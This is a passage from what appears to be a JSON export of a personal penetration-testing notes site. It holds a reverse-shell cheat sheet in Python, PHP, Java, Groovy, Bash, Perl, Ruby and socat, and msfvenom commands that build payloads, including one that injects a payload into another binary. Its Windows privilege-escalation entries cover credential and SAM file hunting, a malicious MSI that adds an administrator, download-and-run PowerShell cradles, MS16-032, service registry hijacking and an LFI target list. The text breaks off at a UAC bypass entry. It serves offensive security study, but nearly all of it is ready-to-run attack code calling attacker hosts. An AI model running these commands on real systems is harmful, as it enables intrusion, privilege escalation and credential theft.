socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"attackerip\",443));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call([\"/bin/sh\",\"-i\"]);\n\nudp\nstart listener\nnc -nvlp 4445 -u\n\nimport os,pty,socket;\ns=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);\ns.connect((\"10.10.14.17\",4445));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nos.putenv(\"HISTFILE\",'/dev/null');\npty.spawn(\"/bin/sh\");\ns.close()\n\n\nphp\n\n&lt;?php exec(\"nohup bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'\"); ?&gt;\n\nphp -r '$sock=fsockopen(\"10.10.14.6\",666);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n\n\njava reverse shell\n\nr = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; runme.war\n\ngroovy - jenkins\nString host=\"10.10.14.6\";\nint port=666;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n\n\nBash\n\n\n  Method 1:\n    bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1\n    \n  \n  Method 2:\n    exec 5&lt;&gt;/dev/tcp/IP/80\ncat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\n    \n    or:\n    while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done\n    \n  \n  Method 3:\n    bash -c \"0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.6/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\"\n    \n  \n\n\nPerl\nperl -e 'use Socket;$i=\"10.10.14.4\";$p=6677;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n\n\nPerl windows\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"ATTACKING-IP:80\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n\n\nRuby\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n\n\ntelnet\n  rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p\n\n\nasp\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.168 LPORT=443 -f asp -o shell.asp - also works for exporting .aspx\n\n\nxterm\n\n  target\n    xterm -display 10.0.0.1:1\n    \n  \n  attacker\n    root@kali:~# Xnest :1\nroot@kali:~# xhost +targetip\nnote: xserver for :1 listens on 6001\n    \n  \n\n\nrundll32.exe\nTODO\nRegsvr32.exe\nTODO\n\nmsiexec\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi &gt; 1.msi\n\nc:\\&gt; msiexex \\q \\i http://10.10.10.1/1.msi #from url :D\nc:\\&gt; msiexex \\q \\i 1.msi\n\n\nexe\nmsfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4444 -f exe -o shell.exe\n\ninjected in another binary\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x \"/somebinary.exe\" -o bad_binary.exe\n\n\nsocat\n\n\n  kali\n    socat file:`tty`,raw,echo=0 tcp-listen:4444  \n    \n  \n  victim\n    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  \n    \n  \n  binaries : https://github.com/andrew-d/static-binaries\n    wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  \n    \n  \n\n\ngetting TTY\n\nphineas fisher magic\n\n\n  In reverse shell\n    $ python -c 'import pty; pty.spawn(\"/bin/bash\")'\nCtrl-Z\n    \n  \n  In Kali\n    $ stty raw -echo\n$ fg\n    \n  \n  in reverse shell\n    $ reset\n$ export SHELL=bash;  export TERM=xterm-256color\n$ stty rows 38 columns 116\n    \n  \n\n\nperl\nperl -e 'exec \"/bin/sh\";'\nperl: exec \"/bin/sh\";\n\n\nor\nperl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n\nruby\nruby: exec \"/bin/sh\"\n\nirb\nexec \"/bin/sh\"\n\n\nvi\nfrom within vi\n:!bash\n:set shell=/bin/bash:shell\n\nor\nvi ;/bin/bash\n\n\nold nmap\n\nnmap --interactive\nnmap&gt; !sh\n\n\nexpect to get tty\n$ cat sh.exp\n#!/usr/bin/expect\n# Spawn a shell, then allow the user to interact with it.\n# The new shell will have a good enough TTY to run tools like ssh, su and login\nspawn sh\ninteract\n\n\n\nSSL  encrypted  connection\n\nallow  only  Alice’s  IP  (10.0.0.4)  to  connect  to  it:\n\n\n  target:\n    C:\\Users\\offsec&gt;ncat -‐exec  cmd.exe -‐allow   10.0.0.4\t--‐vnl  4444 -‐ssl\n    \n  \n  hacker:\n    ncat -v 10.0.0.22 4444 --ssl"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-1-initial": {
						"id": "4-win-privesc-1-initial",
						"title": "initial",
						"category": "",
						"url": " /4-win-privesc/1-initial/",
						"content": "IMPORTANTE  \ndir /r\ndir /A\nGet-ChildItem . -Force\n—\n\n\nAutomatic tools\n\n1 powerup\n| from file\nc:&gt; powershell.exe -nop -exec bypass\nPS C:&gt; ./PowerUp.ps1\nPS C:&gt; Invoke-AllChecks\n\nc:&gt; powershell.exe -nop -exec bypass\nPS c:&gt; Import-MOdule ./PowerUp.ps1\nPS c:&gt; Invoke-AllChecks\n\n| from url\npowershell.exe  -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerUp.ps1')\"\n\n\n2 winpeas\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile \"IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.6/winPEAS64.exe','C:\\users\\Administrator\\Documents\\wp.exe')\"\n\nc:\\users\\kosts\\Desktop&gt; .\\wp.exe\n\n\n3 watson\nsame as winpeas\n \n \nManual info gathering\n\n\nOperating System\n\n| what os and arch?\n\nsysteminfo\nwmic qfe\n\n\n| environment variables\n\nset\n\nGet-ChildItem Env: | ft Key,Value\n\n| drives\n\nnet use\nwmic logicaldisk get caption, description, providername\nwmic logicaldisk get name\nwmic logicaldisk get caption\ndiskpart\nlist volume\n\n\nGet-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root\n\nget-psdrive -psprovider filesystem\n\n\n\n| mount/map\n\nnet use \\\\IP address\\IPC$ \"\" /u:\"\"\nnet use \\\\192.168.1.101\\IPC$ \"\" /u:\"\"\n\n \n \nUsers\n| whoami\n\nwhoami /priv\necho %USERNAME%\n\n$env:UserName\n\n| other users\n\nnet users\nnet users /domain\ndir /b /ad \"C:\\Users\\\"\ndir /b /ad \"C:\\Documents and Settings\\\"\n\nGet-LocalUser | ft Name,Enabled,LastLogon\nGet-ChildItem c:\\Users -Force | select Name\n\n\n| logged in?\n\nqwinsta\n\n\n| groups\n\nnet localgroup\n\nGet-LocalGroup | ft Name\n\n\n| any admin?\n\nnet localgroup Administrators\n\nGet-LocalGroupMember Administrators | ft Name,PrincipalSource\n\n\n| registry autologon?\n\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"\n\nGet-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon' | select \"Default*\"\n\n| Credential manager?\n\ncmdkey /list\ndir C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\ndir C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n\n| can we access SAM and System ?\n\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n\n\n \n \nprograms, process and services\n\n| what is installed?\n\ndir /a \"C:\\Program Files\"\ndir /a \"C:\\Program Files (x86)\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\n\nGet-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime\nGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name\n\n\n| any weak folder or file permission?\n\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"Everyone\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"Everyone\"\n\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"BUILTIN\\Users\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"BUILTIN\\Users\"\n\n| Modify Permissions for Everyone or Users on Program Folders?\n\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"Everyone\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"Everyone\"\n\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"BUILTIN\\Users\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"BUILTIN\\Users\"\n\nGet-ChildItem 'C:\\Program Files\\*','C:\\Program Files (x86)\\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}\n\nGet-ChildItem 'C:\\Program Files\\*','C:\\Program Files (x86)\\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\\Users'} } catch {}}\n\n\n| accesschk  to check for writeable folders and files.\n\naccesschk.exe -qwsu \"Everyone\" *\naccesschk.exe -qwsu \"Authenticated Users\" *\naccesschk.exe -qwsu \"Users\" *\n\nGet-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ?{$_.AccessToString -match \"Everyone\\sAllow\\s\\sModify\"}\n\n\n| whats running? ports?\n\ntasklist /svc\ntasklist /v\nnet start\nsc query\n\nGet-Process | where {$_.ProcessName -notlike \"svchost*\"} | ft ProcessName, Id\nGet-Service\n\nThis one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.\nGet-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize\n\n| kill a  process\n\ntaskkill /PID 1532 /F\n\n\n| weak service permission?\n\naccesschk.exe -uwcqv \"Everyone\" *\naccesschk.exe -uwcqv \"Authenticated Users\" *\naccesschk.exe -uwcqv \"Users\" *\n\n| Are there any unquoted service paths?\n\nwmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i \"Auto\" 2&gt;nul |findstr /i /v \"C:\\Windows\\\\\" 2&gt;nul |findstr /i /v \"\"\"\n\ngwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name\n\n| scheduled tasks?\n\nschtasks /query /fo LIST 2&gt;nul | findstr TaskName\ndir C:\\windows\\tasks\n\nGet-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State\n\n| startup?\n\nwmic startup get caption,command\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\ndir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"\ndir \"C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\"\n\nGet-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl\nGet-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\nGet-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\nGet-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\nGet-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\nGet-ChildItem \"C:\\Users\\All Users\\Start Menu\\Programs\\Startup\"\nGet-ChildItem \"C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup\"\n\n\n| is alwaysinstallelevated enabled?\n\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n \n \nnetworking\n| basic\nipconfig /allows\n\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\nGet-DnsClientServerAddress -AddressFamily IPv4 | ft\n\n| routes?\nroute print\n\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex\n\n\n| arp cache?\narp -a\n\nGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State\n\n| conection to others?\nnetstat -ano\n\n| host file?\nC:\\WINDOWS\\System32\\drivers\\etc\\hosts\n\n| firewall?\nnetsh firewall show state\nnetsh firewall show config\nnetsh advfirewall firewall show rule name=all\nnetsh advfirewall export \"firewall.txt\"\n\n| more interfaces?\nnetsh dump\n\n| snmp configurations?\n reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s\n\n Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse\n\n\nFiles and Sensitive Information\n| passwords in registry?\nreg query HKCU /f password /t REG_SZ /s\nreg query HKLM /f password /t REG_SZ /s\n\n\n| sysprep or unattended?\n\ndir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul\n\n\nGet-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like \"*.xml\" -or $_.Name -like \"*.txt\" -or $_.Name -like \"*.ini\")}\n\n\n| IIS\ndir /a C:\\inetpub\\\ndir /s web.config\ndir /s *root.txt 2&gt;nul\n\nC:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\n\n\nGet-Childitem –Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue\n\n| iis logs\nC:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].log\n\n\n| Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?\ndir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf\n\nGet-Childitem –Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue\n\n| apache logs?\ndir /s access.log error.log\n\nGet-Childitem –Path C:\\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue\n\n| any common insta win?\ndir /s *pass* == *vnc* == *.config* 2&gt;nul\nfindstr /si password *.xml *.ini *.txt *.config 2&gt;nul\n\nGet-Childitem –Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue\nGet-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern \"password\"\n\n\ntasklist\nsysteminfo\nwhoami /priv\nnet users\nnet user &lt;user&gt;\nipconfig /all\nnetstat -ano\nnetsh firewall show state\nnetsh firewall show config\nnetsh advfirwall firewall show rule name=all\nschtasks /query /fo LIST /v\n\n\n| check updates\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n\n\n  check configuration files who might store credentials\n    c:\\sysprep.inf\nc:\\sysprep\\sysprep.xml\n%WINDIR%\\Panther\\Unattend\\Unattended.xml\n%WINDIR%\\Panther\\Unattended.xml\n    \n     \n \n \n    exploit suggester\n    \n  \n\n\nfrom kali with systeminfo\n| Windows Exploit Suggester - Next Generation\nhttps://github.com/bitsadmin/wesng\n\n| Windows Exploit Suggester\nhttps://github.com/AonCyberLabs/Windows-Exploit-Suggester\npython /home/nikhil/scripts/windows-exploit-suggester.py -d 2016-07-02-mssb.xls -i systeminfo -l\n\n-l : show only local exploits\n\nfrom box\n|  windows-privesc-check v2\nhttps://github.com/pentestmonkey/windows-privesc-check\n\n \n \ncomands\n\n| windows admin to system :\nPSEXEC.exe -i -s -d CMD\n\n| connect remotely psexec\ntemes credenciales y smb esta abierto? proba\npsexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125\n\n| add admin user account\nnet user /add [username] [password]\nnet localgroup administrators [username] /add\n\nOR WITH binary\n#include\nint main()\n{ int i;\n\ni = system(“net user /add ashoka qwerty”);\ni = system(“net localgroup administrators ashoka /add”);\nreturn 0;\n\n}\n\n| find weak permissions via Cacls or ICacls\ncacls “C:\\Program Files” /T | findstr Users\nor\nicacls “C:\\Program Files” /T | findstr Users\n\n\nicacls  \"c:\\program files\\serviio\\bin\\serviioService.exe\"\n\n\n \n \nanexo\nbased on : https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-10-always-install-elevated": {
						"id": "4-win-privesc-10-always-install-elevated",
						"title": "always install elevated",
						"category": "",
						"url": " /4-win-privesc/10-always-install-elevated/",
						"content": "_WPE-09 - Always Install Elevated\n\nWindows environments provide a group policy setting which allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges\n\n| 1 verify\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n\n| 2 Generate payload on attacking machine:\nmsfvenom -p windows/exec CMD='net localgroup administrators minilow /add' -f msi-nouac -o setup.msi\n\n| 3 Run it on the target machine:\nmsiexec /quiet /qn /i C:\\Temp\\setup.msi\n\n\n| 4 Reverse shell con system ya en el msi\nTODO"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-11-secondary-logon-ms16-032": {
						"id": "4-win-privesc-11-secondary-logon-ms16-032",
						"title": "secondary logon handle",
						"category": "",
						"url": " /4-win-privesc/11-secondary-logon-ms16-032/",
						"content": "WPE-11 - Secondary Logon Handle\n\nusando el de empire [https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1]\n\n| modificamos invoke-ms160932.ps1 y le agregamos al final:\nInvoke-MS16032 -Command \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 444\"\n\n| levantamos un server http que tenga  Invoke-PowershellTcp.ps1 y invoke-ms16032.ps1\npython -m SimpleHTTPServer 80\n\n| levantamos un listener\nnc -nlvp 444\n\n\n| en target:\nC:&gt; %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -nop -ep bypass -c  \"iex(New-Object Net.Webclient).downloadString('http://10.10.14.14/invoke-ms16032.ps1')\""
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-12-insecure-registry": {
						"id": "4-win-privesc-12-insecure-registry",
						"title": "insecure registry permissions",
						"category": "",
						"url": " /4-win-privesc/12-insecure-registry/",
						"content": "WPE-12 - Insecure Registry Permissions\n\n| 1 identify\nThe process of privilege escalation via insecure registry permissions is very simple. Registry keys for the services that are running on the system can be found in the following registry path:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\n\n\nIf a standard user has permissions to modify the registry key “ImagePath” which contains the path to the application binary then he could escalate privileges to system as the Apache service is running under these privileges.\n\n \n \n| 2 compile binary\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4445 -f exe -o shell2.exe\n\n \n \n| 3 start listener\nnc -nlvp 4444\n\n \n \n| 4 modify registry\nThe only thing that is required is to add a registry key that will change the ImagePath to the location of where the malicious payload is stored.\nC:\\Users\\pentestlab\\Desktop&gt;reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Apache\"\n/t REG_EXPAND_SZ /v ImagePath /d \"C:\\xampp\\shell2.exe\" /f\n\n \n \n| 5 profit"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-13-intel-sysret": {
						"id": "4-win-privesc-13-intel-sysret",
						"title": "intel sysret",
						"category": "",
						"url": " /4-win-privesc/13-intel-sysret/",
						"content": "WPE-13 - Intel SYSRET\n\n| ms12-042\nThis vulnerability allows an attacker to execute code to the kernel (ring0) due to the difference in implementation between processors AMD and Intel. For example an operating system that it is written according to AMD specifications but runs on an Intel hardware is vulnerable. Since the attacker can execute code into the kernel it could allow him to escalate his privileges from user level to system.\n\nWindows environments are vulnerable due to the way that the Windows User Mode Scheduler is handling system requests. This issue affects 64-bit versions of Windows 2008 and Windows 7 that are running on an Intel chip.\n\n \n| run the exploit agains explorer.exe for example\n\ntasklist\n\nexplorer.exe  1595   console   1  41.1K\n\n\nc:&gt; sysret.exe -pid 1595\nc:&gt; whoami\nnt authority/system"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-14-runas": {
						"id": "4-win-privesc-14-runas",
						"title": "runas",
						"category": "",
						"url": " /4-win-privesc/14-runas/",
						"content": "Windows includes a useful command called RunAs that enables a user to run a program as a different user if credentials are known.\n\nExample\n\nSo we have a program we want to run, we have a shell as a low priv user, and we have the username and password of an admin user from a different machine, but because we have a non-interactive shell there is no option to input the password. What can we do? Let me set up a situation and provide the solution for the problem:\n\n \n| create file\nCreate a file called runme.ps1 (powershell file), and add the contents below to the file:\n$secpasswd = ConvertTo-SecureString \"Welcome1!\" -AsPlainText -Force\n$mycreds = New-Object System.Management.Automation.PSCredential (\"Administrator\", $secpasswd)\n$computer = \"workstation7\"\n[System.Diagnostics.Process]::Start(\"C:\\Users\\alfred\\Desktop\\rev.exe\",\"\", $mycreds.Username, $mycreds.Password, $computer)\n\n\n \n| alternative to runme.ps1\n$password = convertto-securestring -AsPlainText -Force -String\n\"36mEAhz/B8xQ~2VM\";\n$credential = new-object -typename System.Management.Automation.PSCredential -\nargumentlist \"SNIPER\\chris\",$password;\nInvoke-Command -ComputerName LOCALHOST -ScriptBlock { wget\nhttp://10.10.14.23/nc.exe -o C:\\Users\\chris\\nc.exe } -credential $credential;\nInvoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\\Users\\chris\\nc.exe -e\ncmd.exe 10.10.14.23 4444} -credential $credential;\n\n\n \n| create reverse shell\nmsfvenom -p windows/shell_reverse_tcp LPORT=666 LHOST=10.10.14.6 -f exe -o rev.exe\n\n\n \n| execute\nC:\\&gt; powershell -ExecutionPolicy Bypass -File runme.ps1\n\n\nRUNAS With saved keys\n\nif you see keys with cmdkey /list , you can get a shell with those saved keys\nrunas /user:ACCESS\\Administrator /savecred \"powershell -c IEX (New-Object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')\""
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-15-lfi-files": {
						"id": "4-win-privesc-15-lfi-files",
						"title": "LFI files",
						"category": "",
						"url": " /4-win-privesc/15-LFI-FILES/",
						"content": "C:\\Apache\\conf\\httpd.conf\nC:\\Apache\\logs\\access.log\nC:\\Apache\\logs\\error.log\nC:\\Apache2\\conf\\httpd.conf\nC:\\Apache2\\logs\\access.log\nC:\\Apache2\\logs\\error.log\nC:\\Apache22\\conf\\httpd.conf\nC:\\Apache22\\logs\\access.log\nC:\\Apache22\\logs\\error.log\nC:\\Apache24\\conf\\httpd.conf\nC:\\Apache24\\logs\\access.log\nC:\\Apache24\\logs\\error.log\nC:\\Documents and Settings\\Administrator\\NTUser.dat\nC:\\php\\php.ini\nC:\\php4\\php.ini\nC:\\php5\\php.ini\nC:\\php7\\php.ini\nC:\\Program Files (x86)\\Apache Group\\Apache\\conf\\httpd.conf\nC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\access.log\nC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\error.log\nC:\\Program Files (x86)\\Apache Group\\Apache2\\conf\\httpd.conf\nC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\access.log\nC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\error.log\nc:\\Program Files (x86)\\php\\php.ini\nC:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf\nC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\access.log\nC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\error.log\nC:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf\nC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\access.log\nC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\error.log\nC:\\Program Files\\FileZilla Server\\FileZilla Server.xml\nC:\\Program Files\\MySQL\\my.cnf\nC:\\Program Files\\MySQL\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.cnf\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.cnf\nC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.cnf\nC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.cnf\nC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.cnf\nC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.ini\nC:\\Program Files\\php\\php.ini\nC:\\Users\\Administrator\\NTUser.dat\nC:\\Windows\\debug\\NetSetup.LOG\nC:\\Windows\\Panther\\Unattend\\Unattended.xml\nC:\\Windows\\Panther\\Unattended.xml\nC:\\Windows\\php.ini\nC:\\Windows\\repair\\SAM\nC:\\Windows\\repair\\system\nC:\\Windows\\System32\\config\\AppEvent.evt\nC:\\Windows\\System32\\config\\RegBack\\SAM\nC:\\Windows\\System32\\config\\RegBack\\system\nC:\\Windows\\System32\\config\\SAM\nC:\\Windows\\System32\\config\\SecEvent.evt\nC:\\Windows\\System32\\config\\SysEvent.evt\nC:\\Windows\\System32\\config\\SYSTEM\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\System32\\winevt\\Logs\\Application.evtx\nC:\\Windows\\System32\\winevt\\Logs\\Security.evtx\nC:\\Windows\\System32\\winevt\\Logs\\System.evtx\nC:\\Windows\\win.ini\nC:\\xampp\\apache\\conf\\extra\\httpd-xampp.conf\nC:\\xampp\\apache\\conf\\httpd.conf\nC:\\xampp\\apache\\logs\\access.log\nC:\\xampp\\apache\\logs\\error.log\nC:\\xampp\\FileZillaFTP\\FileZilla Server.xml\nC:\\xampp\\MercuryMail\\MERCURY.INI\nC:\\xampp\\mysql\\bin\\my.ini\nC:\\xampp\\php\\php.ini\nC:\\xampp\\security\\webdav.htpasswd\nC:\\xampp\\sendmail\\sendmail.ini\nC:\\xampp\\tomcat\\conf\\server.xml"
					}

					
				
			
		
			
				
					,
					

					"4-win-privesc-16-uac": {
						"id": "4-win-privesc-16-uac",
						"title": "UAC bypass",
						"category": "",
